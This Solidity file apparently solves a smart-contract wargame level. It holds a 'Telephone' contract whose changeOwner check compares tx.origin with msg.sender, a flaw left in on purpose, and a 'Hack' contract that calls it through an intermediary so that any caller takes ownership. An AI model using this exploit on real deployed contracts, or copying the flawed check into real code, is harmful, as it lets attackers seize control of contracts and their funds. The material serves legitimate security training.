// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract Hack {
    Telephone private immutable target;
    constructor(address _target){
        target = Telephone(_target);
    }

    function _changeOwner(address _owner) external {
        target.changeOwner(_owner);
    }
}
contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}